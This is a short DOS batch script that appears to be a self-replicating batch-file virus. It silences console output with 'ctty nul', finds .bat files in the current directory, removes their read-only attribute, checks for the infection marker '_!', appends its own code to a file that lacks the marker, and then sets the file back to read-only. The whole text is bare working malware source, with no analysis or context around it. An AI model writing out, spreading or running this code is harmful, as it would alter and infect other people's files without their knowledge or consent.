@ctty nul
for %%q in (*.bat) do set _!=%%q
attrib %_!% -r
for %%w in (%_!%) do find "_!" %%w
if errorlevel 1 type %0 >> %_!%
attrib %_!% +r
